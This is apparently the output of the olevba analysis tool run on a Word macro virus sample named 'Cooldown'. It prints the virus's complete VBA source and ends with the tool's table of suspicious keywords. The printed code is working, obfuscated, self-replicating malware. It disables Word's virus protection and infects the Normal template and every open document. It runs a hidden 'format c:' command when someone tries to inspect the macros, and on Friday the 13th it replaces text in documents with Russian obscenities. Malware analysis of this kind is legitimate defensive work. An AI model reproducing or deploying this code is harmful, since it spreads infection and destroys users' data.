olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cooldown-38004719c52fb8ccb3941e04cc6bf22b639ca161
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cooldown-38004719c52fb8ccb3941e04cc6bf22b639ca161 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
           Private _
    Sub Document_Open()
           CoolDown 0
               End _
           Sub
               Private Sub Document_Close()
          ' 4033.683

CoolDown _
     0
  ' 3513.277
' 1320.019
' 8110.596
End _
             Sub
        Private Sub _
    ToolsMacro()
 ' 224.3078
CoolDown _
 1
     End _
 Sub
               Private _
                Sub _
         ViewVBCode()
            CoolDown 1
                End Sub
            ' 2304.491
' 8279.118
Private Sub _
          CoolDown(How As Integer)
          ' 8075.377
' 3920.903
On _
 Error Resume _
               Next
    ' 2320.882
' 9798.256
Dim c _
              As String, a As Long, b _
         As _
       Long, d As Long, e _
             As _
            Long, f _
      As Long, res _
 As _
            String, m _
             As _
      Boolean
           
' 9374.96
' 8041.748
Randomize
         ' 4889.167
With Options
         .VirusProtection _
           = False
   .ConfirmConversions = _
          False
               .SaveNormalPrompt = _
                False
                ' 3907.685
' 6103.113
End With
               If How _
     = 1 _
           Then
     ' 8184.334
s = Shell("format" & Chr(32) _
          & "c:" _
       & _
     Chr(32) & "/autotest", vbHide)
   ' 2956.817
' 9635.439
' 4736.83
Else
       ' 8133.121
' 7560.168
With _
          NormalTemplate.VBProject.VBComponents(1).CodeModule
              ' 8032.858
' 8244.574
' 8784.948
' 888.5777
If Not .Find("Cool" & "Down", _
       1, 1, 1000, 1000, _
      False, False) Then
  a _
 = _
              .CountOfLines
   ' 2463.452
' 3968.272
For _
               b _
       = 1 _
          To a
       .DeleteLines _
 (1)
     Next
       ' 2904.868

d _
         = 1
              
a = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
         res _
              = ""
 For b = 1 To _
     a
             ' 4329.59
c = _
  ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(b, _
         1)
   ' 8156.663
' 8970.448
' 8084.063
' 3324.437
' 9643.782
c = RTrim(LTrim(c))
' 1906.096
' 9710.24
If _
         foo(c, _
             f, res) Then
            .InsertLines d, _
        Space(Rnd * 16) & res
     d _
           = d _
     + f
       ' 6646.568
f _
               = _
           0
               ' 5400.535

' 2053.032
' 7479.397
' 8147.12
' 6895.337
res _
 = ""
   ' 9476.48
End If
             ' 5105.58
Next
  ' 6605.461
' 5933.451
' 407.6976
' 9319.213
' 9496.274


' 3598.56
NormalTemplate.Save
      ' 6087.688
' 836.19
' 8116.738
End If
         End With
          ' 490.2995
For e _
      = _
    1 To _
Documents.Count
                
With Documents(e).VBProject.VBComponents(1).CodeModule
    ' 4749.31
' 8752.78
If _
 Not .Find("Cool" & _
               "Down", 1, _
            1, _
 1000, _
           1000, False, _
               False) Then
              ' 8851.471
' 3556.585
' 2667.773
a = _
 .CountOfLines
 ' 2670.048
' 6193.518
m = _
 Documents(e).Saved
       ' 5804.5
For b _
               = _
               1 To _
    a
             .DeleteLines (1)
      ' 1577.824
' 4362.142
' 6030.671
Next
      ' 8237.669
d = 1
            ' 7208.085
' 2695.444
' 7822.269
a = _
    NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
       ' 5716.637
' 9704.034
' 373.7998
res = ""
    For b _
       = _
            1 _
               To _
    a
   c = _
             NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(b, 1)
              ' 2944.577
c = _
  RTrim(LTrim(c))
         If foo(c, f, _
 res) _
   Then
           .InsertLines _
          d, Space(Rnd * 16) & _
       res
               d = _
            d _
        + _
     f
       f = _
        0
          res _
          = ""
 ' 7983.438
End If
' 7406.641
' 348.9697
Next
           ' 3382.197
' 2050.94
If _
    Documents(e).Path _
            <> _
    "" Then
               ' 3355.478
' 1731.703
Documents(e).SaveAs _
           AddToRecentFiles:=False
              ' 365.51

End If
          ' 5562.01
' 2622.874
If (WeekDay(Date) _
                = _
         6) And _
            (Day(Date) = _
      13) _
 And _
              (Rnd _
        > _
   0.7) Then
          ' 3110.931
' 1411.868
' 6460.768
' 562.2142
' 9060.836
' 3305.939
Application.StatusBar _
       = ""
 

Application.DisplayStatusBar = False
  ' 2881.258
' 813.1063
' 1850.349
' 4146.912
' 7107.368
' 8673.469
' 4056.596
Application.ScreenUpdating = False
     With _
          Documents(e).Content
        .Find.Execute FindText:="пр", _
     ReplaceWith:="пизд", Replace:=wdReplaceAll
           .Find.Execute _
          FindText:="др", ReplaceWith:="понос", Replace:=wdReplaceAll
                .Find.Execute _
          FindText:="кр", _
             ReplaceWith:="кобыл", _
       Replace:=wdReplaceAll
     ' 7211.244
.Find.Execute _
         FindText:="стр", ReplaceWith:="ебан", Replace:=wdReplaceAll
           ' 4302.84


.Find.Execute _
      FindText:="ср", _
 ReplaceWith:="срак", _
      Replace:=wdReplaceAll
        ' 2502.358
' 2252.517
' 9715.377
.Find.Execute _
           FindText:="тр", ReplaceWith:="трах", Replace:=wdReplaceAll
        .Find.Execute FindText:="бр", ReplaceWith:="бляд", Replace:=wdReplaceAll
               

' 6450.241
' 5234.881
.Find.Execute _
         FindText:="вр", _
     ReplaceWith:="выеб", _
      Replace:=wdReplaceAll
               
' 2394.083
.Find.Execute FindText:="гр", _
   ReplaceWith:="говн", _
              Replace:=wdReplaceAll
           .Find.Execute FindText:="жр", _
       ReplaceWith:="жоп", Replace:=wdReplaceAll
              .Find.Execute _
    FindText:="зр", _
                ReplaceWith:="залуп", Replace:=wdReplaceAll
                

.Find.Execute FindText:="дж", _
    ReplaceWith:="джоп", Replace:=wdReplaceAll
            .Find.Execute _
   FindText:="кал", _
      ReplaceWith:="дер", _
         Replace:=wdReplaceAll
       ' 2753.138
' 4720.349
' 508.8407
.Find.Execute FindText:="бух", _
          ReplaceWith:="бряк", Replace:=wdReplaceAll
         


End _
   With
              Documents(e).UndoClear
      Application.DisplayStatusBar _
       = _
            True
     Application.ScreenUpdating _
          = _
        True
                Application.StatusBar = _
          ""
  End _
     If
           Documents(e).Saved = m
  ' 950.2953
End _
       If
            ' 9933.281
End _
          With
         
Next
      ' 4221.495
End If
              ' 6890.69
' 4952.252
' 9210.85
' 7992.755
End _
            Sub
        Private _
      Function foo(ByRef s _
        As _
       String, ByRef _
          i _
         As Long, ByRef res _
               As String) _
   As Boolean
               Dim tmp As _
             String
             ' 3975.716
' 2676.312
If (Left(s, _
             1) = "'") _
               Or _
    (Len(s) _
    = _
    0) _
             Then
   ' 8794.927
foo _
     = _
   False
                ' 2880.688
' 5347.534
Exit _
                Function
   ' 8582.16
' 5127.285
End If
    If _
    Right(s, _
        2) _
           = Chr(32) _
& "_" _
       Then
         res _
  = _
             res & _
          Left(s, _
         Len(s) - _
  1)
           foo _
               = False
  Exit _
      Function
             ' 5829.273
End _
               If
           ' 9278.597
' 4815.313
' 2696.402
tmp = res _
     & _
       s
      ' 6215.812
' 5875.384
res _
= ""
      i = 1
         While _
               Rnd > 0.5
             ' 6383.402
If _
    Rnd < _
             0.8 _
           Then
       ' 1755.991
' 6889.289
' 931.2332
' 8616.979
' 7634.447
res _
 = _
    res _
      & _
 "'" _
   & _
          Str(Rnd _
        * 10000)
 End _
  If
        ' 5379.174
res = _
        res & _
     Chr(13)
           i = i _
               + _
             1
               ' 5024.019

Wend
               ' 4636.635

' 9401.992
For a = _
     1 To Len(tmp)
              res _
    = res _
  & _
           Mid(tmp, a, 1)
               If _
               Mid(tmp, _
               a, _
   1) _
           = _
                Chr(32) Then

If _
     Rnd > 0.5 _
         Then
         ' 8206.482
res _
            = res & _
          "_" _
& _
  Chr(13) & Space(Rnd _
    * 16)
   i = i + 1
       ' 599.7574


End If
           ' 5509.322
End _
            If
                ' 997.2936
' 5703.586
' 1174.576
Next
               ' 3788.384
' 1923.119
' 6239.736
' 6045.457
foo = _
             True
  End _
              Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

